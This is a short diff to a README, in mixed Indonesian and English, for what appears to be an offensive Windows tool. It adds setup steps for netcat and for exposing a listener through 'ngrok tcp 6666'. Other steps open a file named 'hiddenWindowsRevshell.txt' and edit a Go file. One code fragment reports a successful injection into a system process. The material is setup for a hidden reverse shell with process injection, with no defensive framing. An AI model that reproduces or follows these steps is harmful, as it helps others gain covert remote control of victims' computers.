@@ -49,6 +49,11 @@ go get golang.org/x/sys/windows
 go get golang.org/x/sys/windows/registry
 
 ```
+Install Netcat
+```bash
+linux: sudo apt install netcat-openbsd
+windows: https://nmap.org/ncat/
+```
 Buka File hiddenWindowsRevshell.txt and paste terminal
 
 ```bash
@@ -63,6 +68,8 @@ https://ngrok.com/download/windows
 Running ngrok + paste di file k0m1t3dc.go
 ```bash
 ngrok tcp 6666
+```
+```bash
 	if attemptInjection() {
 		fmt.Println("[+] Successfully injected into system process")
 	} else {
